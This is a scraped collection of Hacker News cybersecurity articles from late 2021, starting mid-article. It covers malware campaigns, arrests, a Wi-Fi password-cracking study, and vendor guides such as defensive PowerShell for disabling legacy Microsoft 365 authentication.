reputation to deliver – with an established product that’s part of the CloudLinux product portfolio.\nTuxCare has committed to providing extended maintenance support for CentOS 8 through 2025 – giving you several more years to make a decision about your CentOS 8 workloads, instead of just four months. It significantly reduces the pressure on your team.\nAct now and secure your CentOS 8 workload\nCentOS 8 maintenance support is ending, and it ends soon. Organizations that still rely on CentOS 8 do not have a huge amount of time to make a decision about an alternative distribution.\nWe’ve outlined a couple of distributions that you can essentially use as drop-in replacements, but given that two of these are brand new it is understandable that you may want to see how these distributions pan out before you commit.\nIf that’s the case, consider signing up for extended support to buy yourself some more time to decide. However, you must make a decision of some sort. Not acting is not an option – the risks are simply too great.\n###\nThis article was written for The Hacker News by Joao Correia, Technical Evangelist at TuxCare.

{'title': 'Russian TrickBot Gang Hacker Extradited to U.S. Charged with Cybercrime',
'text': 'A Russian national, who was arrested in South Korea last month and extradited to the U.S. on October 20, appeared in a federal court in the state of Ohio on Thursday to face charges for his alleged role as a member of the infamous TrickBot group.\nCourt documents showed that Vladimir Dunaev, 38, along with other members of the transnational, cybercriminal organization, stole money and confidential information from unsuspecting victims, including individuals, financial institutions, school districts, utility companies, government entities, and private businesses.\n\nStarting its roots as a banking trojan in 2016, TrickBot has evolved into a modular, multi-stage Windows-based crimeware solution capable of pilfering valuable personal and financial information, and even dropping ransomware and post-exploitation toolkits on compromised devices. The malware is also notorious for its resilience, having survived at least two takedowns spearheaded by Microsoft and the U.S. Cyber Command a year ago.\nHowever, on the legal front, the U.S. government earlier this year charged a 55-year-old Latvian woman named Alla “Max“ Witte, who the prosecutors said worked as a programmer “overseeing the creation of code related to the monitoring and tracking of authorized users of the Trickbot malware.“ Dunaev is the second Trickbot defendant to be arrested in 2021.\nDunaev, specifically, is said to have worked as a developer for the group, in charge of creating, deploying, and managing the Trickbot malware beginning in November 2015, while also overseeing the malware’s execution, as well as designing Firefox web browser modifications and helping to hide the malware from detection by security software.\n\nIn early September, South Korean media outlets reported the arrest of Dunaev (then identified only as “Mr. A“) at the Incheon International Airport when attempting to depart for Russia after being stranded in the country for over a year due to COVID-19. The suspect, who arrived in February 2020, also had his passport expired in the interim period, forcing him to stay in a hotel while awaiting for a replacement.\n\nBut once the passport was re-issued, the defendant tried to leave for his native home in Russia, leading to his arrest pursuant to an extradition request from the U.S. Dunaev has been charged with conspiracy to commit computer fraud and aggravated identity theft, conspiracy to commit wire and bank fraud, conspiracy to commit money laundering, and multiple counts of wire fraud, bank fraud, and aggravated identity theft.\nIf found guilty on all counts, the defendant faces a total prison term of 60 years.\n“Trickbot attacked businesses and victims across the globe and infected millions of computers for theft and ransom, including networks of schools, banks, municipal governments, and companies in the health care, energy, and agriculture sectors,“ said Deputy Attorney General Lisa O. Monaco in a statement.\n“This is another success for the Department’s recently launched Ransomware and Digital Extortion Task Force in dismantling ransomware groups and disrupting the cybercriminal ecosystem that allows ransomware to exist and to threaten our critical infrastructure,“ O. Monaco added.\n\n\nFound this article interesting? Follow THN on Facebook, Twitter  and LinkedIn to read more exclusive content we post.',

{'title': 'A Guide to Shift Away from Legacy Authentication Protocols in Microsoft 365',
'text': 'Microsoft 365 (M365), formerly called Office 365 (O365), is Microsoft’s cloud strategy flagship product with major changes ahead, such as the deprecation of their legacy authentication protocols.\nOften stored on or saved to the device, Basic Authentication protocols rely on sending usernames and passwords with every request, increasing the risk of attackers capturing users’ credentials, particularly if not TLS protected. Basic Authentication, while necessary for companies using legacy software, is unable to enforce MFA and is superseded by Modern Authentication.\nThe legacy settings have been on Microsoft’s radar to fix for years. In 2018, Microsoft announced it would introduce a series of changes — and ultimately deprecation — to its authentication controls as a means to help organizations mitigate the risk. These changes were set to take place over a number of years, and in September 2021, they announced that they will begin to permanently disable Basic Auth in all tenants, regardless of usage, with the exception of SMTP Auth by late 2022. \nIn order to enable a smooth transition from these legacy protocols to a modern environment, Adaptive Shield has created a step-by-step guide to help you reduce risk and reinforce your organization’s M365 security.\nAdaptive Shield has also developed and released a PowerShell script that creates a unified report to map out the organization’s posture to know which users have legacy protocols enabled — for you to copy-paste. This article covers the broad strokes of the guide from the discovery techniques and blocking access processes while showing you how to handle special exclusions. \nTo download the full guide with all the scripts, click here.  \nList of Basic Authentication Protocols \nTo secure the organization’s deployment, the first step is knowing what types of basic authentication protocols exist. Within Microsoft, the considered basic/legacy protocols include: \nAuthenticated SMTP – Used by POP and IMAP clients to send email messagesAutodiscover – Used by Outlook and EAS clients to find and connect to mailboxes in Exchange OnlineExchange ActiveSync (EAS) – Used to connect to mailboxes in Exchange OnlineExchange Online PowerShell – Used to connect to Exchange Online with remote PowerShellExchange Web Services – A programming interface that’s used by Outlook, Outlook for Mac, and third-party appsIMAP – Used by IMAP email clients, allowing users to access email from anywhere and any deviceMAPI over HTTP – Used by Outlook 2010 and laterOAB (Offline Address Book) – A copy of address list collections that are downloaded and used by OutlookOutlook Service – Used by the Mail and Calendar app for Windows 10POP3 – Used by POP email clients to download new messages and delete them from the email serverReporting Web Services Other clients – Any other protocols identified as utilizing legacy authentication\nThese authentication protocols do not support modern authentication mechanisms like multi-factor authentication (MFA), which means that enabling MFA won’t suffice. \nTo enhance security and mitigate risk, organizations must find all the users and services that use the legacy protocols, migrate to use modern protocols, and block the basic ones.\nThis whitepaper will take you through the discovery and blocking process, in addition to sharing instructions for additional controls, like Mailbox services and Conditional Access policies, that can reinforce your Microsoft 365 security posture.\nDiscovery: Know Your Posture\nBefore shutting down all legacy protocols within the organization, it is important to identify users and services that are using basic authentication. Rather than reduce productivity and generate user frustration, it is important to let users know that the system is being upgraded, which will help avoid business interruptions and promote a painless transition to modern protocols. \nThe are a few ways to learn about your organization’s posture using these methods: \nPowershell script – shows which users have the exchange legacy protocols enabledConditional Access Report – shows actual usage of the basic authentication protocolsAzure AD Sign-In Logs – shows sign-ins performed with legacy authentication clients\nPowerShell Script\nRunning the PowerShell script acts as a good starting point to map out the user and service landscape that needs to be mitigated. \nAfter running a few Powershell cmdlets, the Adaptive Shield team created this PowerShell script (See complete guide for the script ) to merge them all into one unified report. The script generates a file: BasicProtocolsReport.csv. This file will show users and their legacy protocol statuses. Each protocols’ status is tested against Authentication Policy, Mailbox services, and Transport config. Below is the list of the full payload:\nuserhas_mailbox - Indicates if the user has a mailbox licensedblocked - Account status (enabled/disabled)mfa - Multi Factor Authentication enrollment statusauth_policy - Name of effective authentication policy (if set)is_ap_def - Indicates whether the effective authentication policy is an organization default or specifically assigned to the userprotocol columns (activesync, imap, mapi, pop, smtp, outlookservice, powershell, ExchangeWebServices, autodiscover, OfflineAddressBook, rpc, ReportingWebServices) - Status (TRUE - enabled; FALSE - blocked)protocl_method columns (activesync, imap, mapi, pop, smtp, outlookservice) - Each of these protocols can be blocked using mailbox services settings, authentication policy, and transport config (global settings for SMTP) this column’s details which methods are in place to block these protocols.\nConditional Access – Report-Only\nCreate a report with Conditional Access (see figure 1) which simulates the users and services that would be affected if you were to block basic authentication protocols. This report gives you visibility into the users and services actually using the legacy protocols. \nThe suggested run time for this report is three months, over a business quarter, to catch any idle users, and sporadic or time-scheduled services. \nFigure 1: Generate a user and services report over a 3-month period\nReviewing the report and cross referencing it with the PowerShell script results will help you to have a better picture of legacy protocols in use, lowering the possibility of missing services or users that still have basic authentication protocols in play. \nAzure AD Sign-In Logs\nThe Azure AD sign-in logs are another useful way to know your posture. Diving into the logs and filtering “Client app“ can reveal sign-ins performed with legacy authentication clients.\nFigure 2: Reveal sign-ins performed with legacy authentication clients\nJust note that the Azure sign-in logs’ retention is up to 30 days and you may end up missing users and services if this is the only tactic used.\nLearn how an SSPM solution can automate this process for you. \nBlocking Access\nAfter carefully investigating and discovering all of the usage of basic authentication protocols, it is time to block them.\nThere are a few well-known approaches to blocking authentication protocols, a popular one being using the Conditional Access policies. \nHowever, there are drawbacks to using Conditional Access as the first line of defense. \nConditional Access policies are processed post first-factor authentication. This means that the credentials can be compromised (as feedback will still be provided to the client, an advantage in a brute force attack for instance), so the mailbox might not have been breached but the attacker can try the validated password on other systems.\nAuthentication Policies\nStart at the source. Microsoft has a dedicated feature for blocking basic authentication protocols, making it easy to control using the Admin console.\nGo to the Office Admin center -> Settings -> Org Settings -> Modern authentication and uncheck all of the basic authentication protocols (make sure that modern authentication is checked). See Figure 3. \nFigure 3: All basic authentication protocols are unchecked\nChanging settings in the admin center creates a new authentication policy and sets it as the organization’s default policy. \nUse PowerShell to validate: \n$default_policy = Get-OrganizationConfig | Select DefaultAuthenticationPolicy;\nGet-AuthenticationPolicy $default_policy.DefaultAuthenticationPolicy;\n\nYou can set exceptions and assign different authentication policies to specific users using PowerShell commands: \nNew-AuthenticationPolicy -Name “Engineering Group“ -AllowBasicAuthImap\nSet-User -Identity <UserIdentity> -AuthenticationPolicy <PolicyIdentity>\nThis example creates a new authentication policy named Engineering Group that allows basic authentication with IMAP and assigns it to a user.\nAuthentication policies are a must but not enough to stop the threat risk of these legacy protocols alone. The authentication policy covers legacy clients, mailbox protocols such as IMAP and SMTP, and other clients such as PowerShell. However, like Conditional Access, even though the service is blocked, some clients will still provide feedback (allowing certain cyberattacks to succeed in gleaning a password for application in other SaaS apps). To avoid this incriminating feedback, completely turn off the service.\nShutting down a service can only be done for mailboxes, which covers six protocols out of the 13. Blocking the authentication policy covers the rest.\nMailbox Services and Transport Config\nDisabling a mailbox service (or enabling in case of exclusion) can be done using the UI per user.\nGo to the Office Admin center -> Users -> Active users -> select a user (with mailbox) -> Mail tab -> Manage email apps and uncheck the basic authentication protocols: POP, IMAP, SMTP. See figure 4. \nNote that SMTP, MAPI over HTTP, and Mobile (Exchange ActiveSync) support both basic and modern authentication.\nFigure 4. Basic authentication protocols are unchecked\nThere is no SMTP bulk edit multiple mailboxes (POP and IMAP bulk edit can be found in the classic Exchange Admin Center).\nTransport config controls the entire Exchange organization, and one of its capabilities is to turn off the SMTP service (both basic and modern). \nUse PowerShell command to disable SMTP globally.\nSet-TransportConfig -SmtpClientAuthenticationDisabled $true\nIn order to block basic authentication protocols for all mailboxes or subset use Powershell cmdlets:\n$Users = Get-CASMailbox -ResultSize unlimited\n$Users | foreach {Set-CASMailbox -Identity $_ -SmtpClientAuthenticationDisabled $true -ActiveSyncEnabled $false -ImapEnabled $false -MapiEnabled $false -PopEnabled $false -OWAEnabled $false} \nExclusions\nThere are cases that you might consider excluding and allowing legacy protocols. For example, a manager who is using an older device or a script that was developed using the legacy protocols and now needs to be redeveloped might require an exclusion. \nIn these cases, it is strongly recommended to:\nDocument: Have a procedure in place for requests and their reasoningLimit: Put in place a time period that will allow the requester time to resolve the issue that they need the legacy protocols, whether replacing the device or time to rewrite the code, etc. Conditional Access: Use compensating controls by allowing only specific devices, or put in place IP restrictions, geofencing, and more with the Conditional Access policies. \nConclusion\nManaging SaaS configurations in an enterprise is complicated and this guide is meant to help ease the pain and smooth the transition from the M365 legacy protocols to a modern environment. The process has multiple steps and requires continuous oversight. From the discovery of the legacy authentication protocols opened and used by users and business processes to blocking access and implementing and managing the exclusions, security teams need to dive in, remediate and manage every problematic use of the authentication protocol. \nIn large-scale environments, where changes always happen and configurations are in the thousands, it is recommended to manage SaaS misconfigurations with an automated SaaS Security Posture Management solution (SSPM).\n\n\nFound this article interesting?

'text': 'Over 70% of Wi-Fi networks from a sample size of 5,000 were hacked with “relative ease“ in the Israeli city of Tel Aviv, highlighting how unsecure Wi-Fi passwords can become a gateway for serious threats to individuals, small businesses, and enterprises alike.\nCyberArk security researcher Ido Hoorvitch, who used a Wi-Fi sniffing equipment costing about $50 to collect 5,000 network hashes for the study, said “the process of sniffing Wi-Fis and the subsequent cracking procedures was a very accessible undertaking in terms of equipment, costs and execution.“\n\nThe new Wi-Fi attack builds on previous findings by Jens “atom“ Steube in 2018 that involves capturing what’s called the PMKIDs associated with a client (aka SSID) in order to attempt a brute-force attack using password recovery tools like hashcat.\n\nPMKID is a unique key identifier used by the access point (AP) to keep track of the pre-shared key — i.e., pairwise master key aka PMK — being used for the client. PMKID is a derivative of AP’S MAC address, client’s MAC address, PMK and PMK Name.\n“Atom’s technique is clientless, making the need to capture a user’s login in real time and the need for users to connect to the network at all obsolete,“ Hoorvitch said in the report. “Furthermore, it only requires the attacker to capture a single frame and eliminate wrong passwords and malformed frames that are disturbing the cracking process.“\n\nThe collected hashes were then subjected to a “mask attack“ to determine if cell phone numbers were used as Wi-Fi passwords, a practice common in Israel, uncovering 2,200 passwords in the process. In a subsequent dictionary attack using “RockYou.txt“ as a password source, the researcher was able to crack an additional 900 hashes, with the number of breached passwords decreasing as the password length increased.\nA successful compromise of the Wi-Fi network could enable a threat actor to mount man-in-the-middle (MiTM) attacks to gain access to sensitive information, not to mention pivot laterally across the network to breach other critical systems that are connected to the same network.\n“The lesson here? The longer the password, the better,“ Hoorvitch said. “A strong password should include at least one lower case character, one upper case character, one symbol, one digit. It should be at least 10 characters long.“\n\n\nFound this article interesting? Follow THN on Facebook, Twitter  and LinkedIn to read more exclusive content we post.',

'text': 'Cybersecurity researchers on Wednesday took the wraps off a “simple yet remarkable“ malware loader for malicious Windows binaries targeting Central Europe, North America and the Middle East.\nCodenamed “Wslink“ by ESET, this previously undocumented malware stands apart from the rest in that it runs as a server and executes received modules in memory. There are no specifics available on the initial compromise vector and there are no code or operational overlaps that tie this tool to a known threat actor group.\n\nThe Slovak cybersecurity firm noted that it has seen only a handful of detections in the past two years, suggesting that it could be used in highly-targeted cyber infiltrations.\nWslink is designed to run as a service and can accept encrypted portal executable (PE) files from a specific IP address, which is then decrypted and loaded into memory prior to the execution. To achieve this, the client (i.e., the victim) and the server perform a handshake that involves the exchange of cryptographic keys necessary to encrypt the modules using AES.\n\n“Interestingly, the modules reuse the loader’s functions for communication, keys and sockets; hence they do not have to initiate new outbound connections,“ ESET researcher Vladislav Hrčka said. “Wslink additionally features a well-developed cryptographic protocol to protect the exchanged data.“\n\nThe findings come as researchers from Zscaler and Cisco Talos disclosed yet another malware loader called SQUIRRELWAFFLE that’s distributed via spam email campaigns to deploy Qakbot and Cobalt Strike on compromised systems.\n\n\nFound this article interesting?

'text': 'Malicious actors have yet again published two more typosquatted libraries to the official NPM repository that mimic a legitimate package from Roblox, the game company, with the goal of distributing stealing credentials, installing remote access trojans, and infecting the compromised systems with ransomware.\nThe bogus packages — named “noblox.js-proxy“ and “noblox.js-proxies“ — were found to impersonate a library called “noblox.js,“ a Roblox game API wrapper available on NPM and boasts of nearly 20,000 weekly downloads, with each of the poisoned libraries, downloaded a total of 281 and 106 times respectively.\n\nAccording to Sonatype researcher Juan Aguirre, who discovered the malicious NPM packages, the author of noblox.js-proxy first published a benign version that was later tampered with the obfuscated text, in reality, a Batch (.bat) script, in the post-installation JavaScript file.\n\nThis Batch script, in turn, downloads malicious executables from Discord’s Content Delivery Network (CDN) that are responsible for disabling anti-malware engines, achieving persistence on the host, siphoning browser credentials, and even deploying binaries with ransomware capabilities.\n\nRecent research from Check Point Research and Microsoft-owned RiskIQ revealed how threat actors are increasingly abusing Discord CDN, a platform with 150 million users, to persistently deliver 27 unique malware families, ranging from backdoors and password stealers to spyware and trojans.\n\nAlthough both the malicious NPM libraries have since been taken down and are no longer available, the findings are yet another indication as to how popular code registries like NPM, PyPI, and RubyGems have emerged as a lucrative frontier for carrying out a variety of attacks.\nThe disclosure also mirrors a recent supply-chain attack aimed at “UAParser.js,“ a popular JavaScript NPM library with over 6 million weekly downloads, that resulted in the developer’s account being hijacked to corrupt the package with cryptocurrency mining and credential-stealing malware, days after three other copycat crypto-mining packages were purged from the registry.\n\n\nFound this article interesting?

{'title': 'Hackers Using Squirrelwaffle Loader to Deploy Qakbot and Cobalt Strike',
'text': 'A new spam email campaign has emerged as a conduit for a previously undocumented malware loader that enables the attackers to gain an initial foothold into enterprise networks and drop malicious payloads on compromised systems.\n“These infections are also used to facilitate the delivery of additional malware such as Qakbot and Cobalt Strike, two of the most common threats regularly observed targeting organizations around the world,“ said researchers with Cisco Talos in a technical write-up.\n\nThe malspam campaign is believed to have commenced in mid-September 2021 via laced Microsoft Office documents that, when opened, triggers an infection chain that leads to the machines getting infected with a malware dubbed SQUIRRELWAFFLE.\nMirroring a technique that’s consistent with other phishing attacks of this kind, the latest operation leverages stolen email threads to give it a veil of legitimacy and trick unsuspecting users into opening the attachments.\nWhat’s more, the language employed in the reply messages matches the language used in the original email thread, demonstrating a case of dynamic localization put in place to increase the likelihood of success of the campaign. The top five languages used to deliver the loader are English (76%), followed by French (10%), German (7%), Dutch (4%), and Polish (3%).\n\nEmail distribution volumes capitalizing on the new threat peaked around September 26, based on data compiled by the cybersecurity firm.\nWhile previously compromised web servers, primarily running versions of the WordPress content management system (CMS), function as the malware distribution infrastructure, an interesting technique observed is the use of “antibot“ scripts to block web requests that originate from IP addresses not belonging to victims but rather automated analysis platforms and security research organizations.\n\nThe malware loader, besides deploying Qakbot and the infamous penetration testing tool Cobalt Strike on the infected endpoints, also establishes communications with a remote attacker-controlled server to retrieve secondary payloads, making it a potent multi-purpose utility.\n“After the Emotet botnet takedown earlier this year, criminal threat actors are filling that void,“ Zscaler noted in an analysis of the same malware last month. “SQUIRRELWAFFLE appears to be a new loader taking advantage of this gap. It is not yet clear if SQUIRRELWAFFLE is developed and distributed by a known threat actor or a new group. However, similar distribution techniques were previously used by Emotet.“\n\n\nFound this article interesting? Follow THN on Facebook, Twitter  and LinkedIn to read more exclusive content we post.',

{'title': '[eBook] The Guide to Centralized Log Management for Lean IT Security Teams',
'text': 'One of the side effects of today’s cyber security landscape is the overwhelming volume of data security teams must aggregate and parse. Lean security teams don’t have it any easier, and the problem is compounded if they must do it manually. Data and log management are essential for organizations to gain real-time transparency and visibility into security events. \nXDR provider Cynet has offered up a new guide (read it here) that helps lean organizations understand the importance of centralized log management (CLM). The truth is that even the most well-stocked and staffed teams would have trouble manually handling their log management needs, which is why organizations are increasingly going the automated route. \nOn top of the efficiency of automation, CLM gives organizations much greater visibility into their environment and security events that impact them. However, the benefits of deploying CLM tools and reducing the level of human intervention in log management and analysis are much more than just reducing work hours. \nWhy CLM is critical for lean security teams\nLogs are a natural part of IT management. Each time-stamped event record collected in a log is an important piece of the overall puzzle that is an organization’s security operation. This data can be a trail of breadcrumbs and indicators of compromise, which shows security teams what attackers are doing and attempting to do. However, when these logs are incomplete, improperly sorted, or simply not parsed, the picture becomes murkier and harder to glean. \nCLM tools can help combat this lack of transparency in several ways. First, when there are more data points and logs that can be easily accessed and analyzed, organizations can build significantly better reconstructions of security incidents, different attack attempts, and breaches. Additionally, it helps for the future, as organizations can become better at detecting false positives and negatives, as well as missed detections. Finally, it reduces fatigue and wasted time, letting security teams focus on other key areas. \nThe new guide focuses on these topics, breaking down:\nThe importance of accessing and analyzing log data. As mentioned above, simply having easy access to this data makes organizations better at detecting attacks and understanding previous incidents. More importantly, how data is stored also makes a difference, with data lakes a clear favorite.The four main approaches used to gain centralized log management. Organizations can take a few different paths to improving their log management capabilities, and each comes with its own benefits and drawbacks. Understanding which path to take can help organizations make smarter decisions. Why CLM is critical for security teams’ success. Log management is all about adding greater transparency into an organization’s security events, and handling it manually means organizations might lose out on a lot of key insights. CLM ensures this is not the case. The key benefits of a CLM solution. Building a CLM system from scratch is complex and not always feasible. Moreover, adding expensive tools that include advanced services and features just for CLM functionality isn’t worth it. A CLM solution is an excellent middle ground. CLM also assists with meeting regulatory compliance requirements, automating reports, and managing policy changes. \nLearn more about how lean security teams can benefit from CLM here. \n\n\nFound this article interesting?

'text': 'A cyber attack in Iran left petrol stations across the country crippled, disrupting fuel sales and defacing electronic billboards to display messages challenging the regime’s ability to distribute gasoline.\nPosts and videos circulated on social media showed messages that said, “Khamenei! Where is our gas?“ — a reference to the country’s supreme leader Ayatollah Ali Khamenei. Other signs read, “Free gas in Jamaran gas station,“ with gas pumps showing the words “cyberattack 64411“ when attempting to purchase fuel, semi-official Iranian Students’ News Agency (ISNA) news agency reported.\n\nAbolhassan Firouzabadi, the head of Iran’s Supreme Cyberspace Council, said the attacks were “probably“ state-sponsored but added it was too early to determine which country carried out the intrusions.\nAlthough no country or group has so far claimed responsibility for the incident, the attacks mark the second time digital billboards have been altered to display similar messaging. \nIn July 2021, Iranian Railways and the Ministry of Roads and Urban Development systems became the subject of targeted cyber attacks, displaying alerts about train delays and cancellations and urging passengers to call the phone number 64411 for further information. It’s worth noting that the phone number belongs to the office of Ali Khamenei that supposedly handles questions about Islamic law.\nThe attacks involved the use of a never-before-seen reusable data-wiping malware called “Meteor.“\nCybersecurity firm Check Point later attributed the train attack to a “regime opposition“ threat actor that self-identifies as “Indra“ — referring to the Hindu god of lightning, thunder, and war — and is believed to have ties to hacktivist and other cybercriminal groups, in addition to linking the malware to prior attacks targeting Syrian petroleum companies in early 2020.\n\n“Aiming to bring a stop to the horrors of [Quds Force] and its murderous proxies in the region,“ the group’s official Twitter account bio reads.\n“While most attacks against a nation’s sensitive networks are indeed the work of other governments, the truth is that there is no magic shield that prevents a non-state sponsored entity from creating the same kind of havoc, and harming critical infrastructure in order to make a statement,“ Check Point noted in July.\n\n\nFound this article interesting?

'text': 'Lazarus Group, the advanced persistent threat (APT) group attributed to the North Korean government, has been observed waging two separate supply chain attack campaigns as a means to gain a foothold into corporate networks and target a wide range of downstream entities.\nThe latest intelligence-gathering operation involved the use of MATA malware framework as well as backdoors dubbed BLINDINGCAN and COPPERHEDGE to attack the defense industry, an IT asset monitoring solution vendor based in Latvia, and a think tank located in South Korea, according to a new Q3 2021 APT Trends report published by Kaspersky.\n\nIn one instance, the supply-chain attack originated from an infection chain that stemmed from legitimate South Korean security software running a malicious payload, leading to the deployment of the BLINDINGCAN and COPPERHEDGE malware on the think tank’s network in June 2021. The other attack on the Latvian company in May is an “atypical victim“ for Lazarus, the researchers said.\nIt’s not clear if Lazarus tampered with the IT vendor’s software to distribute the implants or if the group abused the access to the company’s network to breach other customers. The Russian cybersecurity firm is tracking the campaign under the DeathNote cluster.\nThat’s not all. In what appears to be a different cyber-espionage campaign, the adversary has also been spotted leveraging the multi-platform MATA malware framework to perform an array of malicious activities on infected machines. “The actor delivered a Trojanized version of an application known to be used by their victim of choice, representing a known characteristic of Lazarus,“ the researchers noted.\nAccording to previous findings by Kaspersky, the MATA campaign is capable of striking Windows, Linux, and macOS operating systems, with the attack infrastructure enabling the adversary to carry out a multi-staged infection chain that culminates in the loading of additional plugins, which allow access to a wealth of information including files stored on the device, extract sensitive database information as well as inject arbitrary DLLs.\n\nBeyond Lazarus, a Chinese-speaking APT threat actor, suspected to be HoneyMyte, was found adopting the same tactic, wherein a fingerprint scanner software installer package was modified to install the PlugX backdoor on a distribution server belonging to a government agency in an unnamed country in South Asia. Kaspersky referred to the supply-chain incident as “SmudgeX.“\nThe development comes as cyber attacks aimed at the IT supply chain have emerged as a top concern in the wake of the 2020 SolarWinds intrusion, highlighting the need to adopt strict account security practices and take preventive measures to protect enterprise environments.\n\n\nFound this article interesting?

{'title': 'New Attack Lets Hackers Collect and Spoof Browser’s Digital Fingerprints',
'text': 'A “potentially devastating and hard-to-detect threat“ could be abused by attackers to collect users’ browser fingerprinting information with the goal of spoofing the victims without their knowledge, thus effectively compromising their privacy.\nAcademics from Texas A&M University dubbed the attack system “Gummy Browsers,“ likening it to a nearly 20-year-old “Gummy Fingers“ technique that can impersonate a user’s fingerprint biometrics. \n\n“The idea is that the attacker 𝐴 first makes the user 𝑈 connect to his website (or to a well-known site the attacker controls) and transparently collects the information from 𝑈 that is used for fingerprinting purposes (just like any fingerprinting website 𝑊 collects this information),“ the researchers outlined. “Then, 𝐴 orchestrates a browser on his own machine to replicate and transmit the same fingerprinting information when connecting to 𝑊, fooling 𝑊 to think that 𝑈 is the one requesting the service rather than 𝐴.“\nBrowser fingerprinting, also called machine fingerprinting, refers to a tracking technique that’s used to uniquely identify internet users by gathering attributes about the software and hardware of a remote computing system — such as the choice of browser, timezone, default language, screen resolution, add-ons, installed fonts, and even preferences — as well as behavioral characteristics that emerge when interacting with the web browser of the device.\nThus in the event the website populates targeted ads based on only the users’ browser fingerprints, it could result in a scenario where the remote adversary can profile any target of interest by manipulating their own fingerprints to match that of the victim for extended periods of time, all the while the user and the website remain oblivious to the attack.\nPut differently, by exploiting the fact that the server treats the attacker’s browser as the victim’s browser, not only would the former receive same or similar ads like that of the impersonated victim, it also allows the malicious actor to infer sensitive information about the user (e.g., gender, age group, health condition, interests, salary level, etc.) and build a personal behavioral profile.\n\nIn experimental tests, the researchers found that the attack system achieved average false-positive rates of greater than 0.95, indicating that most of the spoofed fingerprints were misrecognized as legitimate ones, thereby successfully tricking the digital fingerprinting algorithms. A consequence of such an attack is a breach of ad privacy and a bypass of defensive mechanisms put in place to authenticate users and detect fraud.\n“The impact of Gummy Browsers can be devastating and lasting on the online security and privacy of the users, especially given that browser-fingerprinting is starting to get widely adopted in the real world,“ the researchers concluded. “In light of this attack, our work raises the question of whether browser fingerprinting is safe to deploy on a large scale.“\n\n\nFound this article interesting?

{'title': 'Hardware-grade enterprise authentication without hardware: new SIM security solution for IAM',
'text': 'The average cost of a data breach, according to the latest research by IBM, now stands at USD 4.24 million, the highest reported. The leading cause? Compromised credentials, often caused by human error. Although these findings continue to show an upward trend in the wrong direction, the challenge itself is not new. What is new is the unprecedented and accelerated complexity of securing the workplace. CISOs/CIOs are dealing with legacy systems, cloud hosting, on-prem, remote workers, office based, traditional software, and SaaS.\nHow businesses adapted was laudable, but now that employees spread across locations, offices and homes – with more than half threatening not to return to offices unless hybrid working is implemented – the challenge morphs into securing a nonuniform perimeter. \nWe know passwords aren’t sufficient. Knowledge-based access is usually fortified with other forms of multi-factor authentication (MFA), such as auth apps or FIDO tokens, and in highly sensitive cases, biometrics.\nWhy strong IAM is essential for hybrid working \nThe era of ’BYOD’ (Bring Your Own Device) has evolved into what Gartner calls Bring-Your-Own-Identity: employees are accessing data from a range of remote devices from a range of different locations.\nCybercriminals can intercept data in a variety of ways, from compromised credentials to phishing scams to man-in-the-middle attacks, which are made easier on public networks with no security controls, such as Wi-Fi hotspots at coffee shops or airports. If your employee access is only based on knowledge factors such as usernames and passwords, attackers could easily gain full access to sensitive data. \nHardware-based security tokens or dongles have gained popularity, particularly at the enterprise level. They generate a code for the user to enter when prompted, so that only the user possessing the token can gain access. But these separate, tiny hardware devices are not without their challenges. \nProblems with hardware authentication\nCost — Security tokens cost between $50-$100 on average for a single device. As a result, these devices tend to be reserved only for a few high-risk individuals – while lower-profile employees are left vulnerable.\nLost devices — Hardware tokens can be lost, stolen, or forgotten, and employees often only notice right when they need access. Ordering new tokens is inconvenient and expensive.\nUX — Finding the device and entering the code takes user effort, and can’t be easily used for rapid provisioning, personnel change, or work with outside contractors. \nAttack risk — Hardware tokens are also not completely effective against MITM attacks – although they can’t be directly remotely accessed, a bad actor can trick the user into entering the code on a fraudulent version of the website/login page.\nThere is an innovative, new technology that provides a strong possession factor for IAM without extra hardware devices – and it’s in everyone’s hands already.\nMobile phone possession as an alternative to hardware tokens\nThe simpler, easier alternative to buying expensive tokens is to make use of something your employees already have: their mobile phone.\nUsing the advanced cryptographic security of the SIM card, mobile networks already authenticate customers securely and invisibly to allow calls and data. SIM-based authentication is tamper-resistant, real-time verification that works the same as chips in bank cards. \nWith no user action or codes to type, SIM-based authentication makes login simple for your employees, but keeps malicious actors out. By authenticating with the SIM card itself, rather than just the mobile number, it’s also possible to check for recent SIM swap activity, stopping account takeover attacks. \nIt’s much more cost-effective, deployable at scale, and universal, meaning every employee, not just a few, has the highest level of security. And unlike tiny and easily-lost hardware dongles, the mobile phone is an essential device that employees will already take with them everywhere. \nNow, APIs by tru.ID open up SIM-based network authentication for enterprises and businesses to implement frictionless, secure verification.\nAny additional concerns over user privacy are alleviated by the fact that tru.ID does not process personally identifiable information between the mobile network and its APIs. It’s purely a URL-based lookup. \nSee tru.ID SIM security solution in action\nOne of the ways to use tru.ID APIs is to implement a passwordless one-tap registration and login solution to access an enterprise system using a companion app. Here’s an example workflow:\n\ntru.ID covers over 2 billion mobile phones in 20 markets and can be deployed in two ways. It can either be integrated directly into a company app (if present) with simple REST APIs and SDKs, or it can be rolled out with a tru.ID companion app that verifies employee access using their mobile credentials. tru.ID is keen to hear from the community to discuss case studies – just visit the website to see it in action in a demo or start coding.\n\n\nFound this article interesting?

Between July 1 and October 19, 2021, Nobelium is said to have singled out 609 customers, who were collectively attacked a grand total of 22,868 times.\n\n“This recent activity is another indicator that Russia is trying to gain long-term, systematic access to a variety of points in the technology supply chain and establish a mechanism for surveilling – now or in the future – targets of interest to the Russian government,“ said Tom Burt, Microsoft’s corporate vice president of customer security and trust.\nThe newly disclosed attacks do not exploit any specific security weaknesses in software but rather leverage a diverse range of techniques such as password spraying, token theft, API abuse, and spear-phishing to siphon credentials associated with privileged accounts of service providers, enabling the attackers to move laterally in cloud environments and mount further intrusions.\nThe goal, according to Microsoft, appears that “Nobelium ultimately hopes to piggyback on any direct access that resellers may have to their customers’ IT systems and more easily impersonate an organization’s trusted technology partner to gain access to their downstream customers.“\n\nIf anything, the attacks are yet another manifestation of Nobelium’s oft-repeated tactics, which has been found abusing trust relationships enjoyed by service providers to burrow into multiple victims of interest for intelligence gain. As mitigations, the company is recommending companies to enable multi-factor authentication (MFA) and audit delegated administrative privileges (DAP) to prevent any potential misuse of elevated permissions.\nThe development also arrives less than a month after the tech giant revealed a new passive and highly targeted backdoor dubbed “FoggyWeb“ deployed by the hacking group to deliver additional payloads and steal sensitive information from Active Directory Federation Services (AD FS) servers.\n\n\nFound this article interesting?

